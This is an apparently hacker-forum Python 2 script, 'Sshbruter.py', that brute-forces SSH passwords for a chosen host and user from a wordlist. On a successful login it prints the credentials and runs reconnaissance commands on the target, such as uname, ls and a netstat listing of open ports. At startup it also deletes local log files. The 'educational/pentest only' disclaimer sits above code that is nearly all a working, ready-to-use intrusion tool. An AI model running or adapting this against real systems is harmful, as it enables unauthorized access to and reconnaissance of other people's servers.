#!/usr/bin/python

# This is SSH brute force
# This was written for educational purpose and pentest only. Use it at your own risk.
# VISIT : http://www.devilzc0de.com
# CODING BY : gunslinger_
# EMAIL : gunslinger@devilzc0de.com
# TOOL NAME : Sshbruter.py
# Inspire by : petimati 
# Special thanks : mywisdom, petimati, kiddies, flyff666, rotlez, 7460, devil_nongkrong, vie and all devilzc0de family
# Greetz : all member of jasakom.com, jatimcrew.com
# Please remember... your action will be logged in target system...
# Author will not be responsible for any damage !!
# Use it with your own risk

################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 


import sys, time, os

# Yeah, we must have best view right ?
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin' or sys.platform == 'Linux' :
	bersihlayar = 'clear'
	hapuslog = 'rm -f *.log'
	hapusbak = 'rm *.py~'
else:
	bersihlayar = 'cls'
        hapuslog = 'del *.log'
	hapusbak = 'del *.py~'
	
try:
	import pexpect, pxssh

except(ImportError):
	print "\nYou need the pexpect module." # If you don't have pexpect module check my suggestion link 
	print "For more information check it out : http://pexpect.sourceforge.net/pexpect.html or http://wiki.openmoko.org/wiki/Pexpect\n"
	sys.exit(1)

# Here the usefull commands...
# You can add more commands what do you like ... lol ! :D
perintah = 'uname -a' # kernel version...
perintah2 = 'pwd' # path of you now...
perintah3 = 'ls' # do you see what do you lookin' for ? :P
perintah4 = 'netstat -an | grep -i listen' # see what open port on target...
# End of commands


def brute(word):
	print "[?] Trying :",word
     	try:
        	s = pxssh.pxssh()
        	s.login (hostname, user, word, login_timeout=10)
		print "\n\t[!] w00t,w00t you've successfully entering SSH target ! "
		print "\t[!] Username :",user 
		print "\t[!] Password :",word, "\n"
		print "\t\n[!] Gathering detail target information : "
		
		time.sleep(3) # sorry only refresh your box... :P


		# Check usefull commands in line 81 - 84
		# You can change with you're command as you like
		s.sendline(perintah)
        	s.prompt()
        	print "\n",s.before
		s.sendline(perintah2)
		s.prompt()
		print "\n",s.before
		s.sendline(perintah3)
		s.prompt()
		print "\n",s.before
		s.sendline(perintah4)
		s.prompt()
		print "\n",s.before
        	s.logout()
		sys.exit(1)
		# End of commands


   	except Exception, e:
		pass
	except KeyboardInterrupt:
		print "\n[-] Quit\n"
		sys.exit(1)
def help ():
	print "################################################################"
	print "#       .___             __          _______       .___        #" 
	print "#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    #" 
	print "#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \    #" 
	print "#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   #" 
	print "#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\    #" 
	print "#        \/                  \/             \/                 #" 
	print "#                   ___________   ______  _  __                #" 
	print "#                 _/ ___\_  __ \_/ __ \ \/ \/ /                #" 
	print "#                 \  \___|  | \/\  ___/\     /                 #" 
	print "#                  \___  >__|    \___  >\/\_/                  #" 
	print "#      est.2007        \/            \/   forum.darkc0de.com   #" 
	print "#                                                              #"
	print "# Sshbruter.py version 1.0                                     #"
	print "# Brute forcing SSH target then got control to your target :)  #"
	print "# Programmmer : gunslinger_                                    #"
	print "# gunslinger[at]devilzc0de[dot]com                             #"
	print "################################################################\n"
	print "\nUsage : ./sshbruter.py <Target hostname/Target IP> <user> <wordlist>"
	print "Eg: ./sshbruter.py 198.162.1.1 root brutewords.txt\n"
	sys.exit(1)

os.system(bersihlayar)
os.system(hapuslog)
os.system(hapusbak)

print "Checking internet connections, please wait alil bit..."
if os.system("ping google.com -c 1"):
	os.system(bersihlayar)
	print "\nmake sure you checked internet connection...\n"
	sys.exit(1)
else:
	os.system(bersihlayar)
	print "NOW YOU'RE CONNECTED TO INTERNET\n"
	time.sleep(1)
	print "3"
	time.sleep(1)
	print "2"
	time.sleep(1)
	print "1\n"
	time.sleep(1)
	print "SYSTEM READY FOR BRUTE FORCE ATTACK !\n" 
	time.sleep(3)
	
	# Sorry once more, timer only make you're system always fresh ! lol :D !

os.system(bersihlayar)

print "################################################################"
print "#       .___             __          _______       .___        #" 
print "#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    #" 
print "#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \    #" 
print "#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   #" 
print "#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\    #" 
print "#        \/                  \/             \/                 #" 
print "#                   ___________   ______  _  __                #" 
print "#                 _/ ___\_  __ \_/ __ \ \/ \/ /                #" 
print "#                 \  \___|  | \/\  ___/\     /                 #" 
print "#                  \___  >__|    \___  >\/\_/                  #" 
print "#      est.2007        \/            \/   forum.darkc0de.com   #" 
print "#                                                              #"
print "# Sshbruter.py version 1.0                                     #"
print "# Brute forcing SSH target then got control to your target :)  #"
print "# Programmmer : gunslinger_                                    #"
print "# gunslinger[at]devilzc0de[dot]com                             #"
print "################################################################\n"

print "\n[!] System Activated for brute forcing..."
print "[!] Please wait until brute forcing finish !\n"
	
if len(sys.argv) != 4 :
	help()

hostname = sys.argv[1]
user = sys.argv[2]

try:
	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "\n[-] Error : Please check your wordlist path or file name...\n"
  	sys.exit(1)
	
time.sleep(3)
print "[+] Loaded :",len(words),"words"
print "[+] Target :",hostname
print "[+] User :",user
print "[+] BruteForcing...\n"
for word in words:
	
	time.sleep(0.1)
	brute(word.replace("\n",""))




















